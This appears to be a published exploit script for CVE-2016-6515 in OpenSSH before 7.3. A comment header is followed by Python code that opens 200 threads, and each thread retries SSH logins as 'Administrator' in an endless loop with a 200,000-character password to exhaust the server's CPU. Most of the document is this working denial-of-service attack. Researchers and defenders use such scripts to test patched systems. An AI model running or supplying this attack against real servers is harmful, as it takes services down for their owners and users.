################################################################################
# Title		: OpenSSH before 7.3 Crypt CPU Consumption (DoS Vulnerability)
# Author	: Jonatan Gomez Garcia
# Vendor	: http://www.openssh.com/
# Software	: http://www.openssh.com/
# Version	: OpenSSH before 7.3
# Tested on	: Windows 2008 R2 Server - penSSH 7.2
# CVE 		: CVE-2016-6515
# Date		: 16-02-2024
#
# Description:
# If the remote machine is installed and running OpenSSH version prior to 7.3,
# it does not limit the password length for authentication. Hence, to exploit
# this vulnerability' we will send a crafted data which is of 20000 characters
# in length to the 'password' field while attempting to log in to a remote
# machine via ssh with username as 'Administrator'.
#
# For more info refer,
# http://www.secpod.com/blog/openssh-crypt-cpu-consumption
################################################################################
#!/usr/bin/env python3

import paramiko
import random
import string
import threading

def ssh_connect(hostname, port, username, password):
    infinito = True
            # Conecta al servidor SSH
    while infinito:
        try:
            # Crea un objeto cliente SSH
            ssh_client = paramiko.SSHClient()

            # Establece la política de aceptación de claves SSH (para evitar la advertencia de claves desconocidas)
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh_client.connect(hostname, port=port, username=username, password=password)
            print("Conexión SSH establecida con éxito a", hostname)
        
        except Exception as e:
            print("Error inesperado:", e)
            


# Datos de conexión
hostname = '10.0.2.7'
port = 22  # Puerto SSH predeterminado es 22
username = 'Administrator'
password = "".join(random.choice(string.ascii_lowercase)for i in range(200000))

# Llama a la función para establecer la conexión SSH.

for i in range(200):
    threading.Thread(target=ssh_connect, args=(hostname, port, username, password)).start()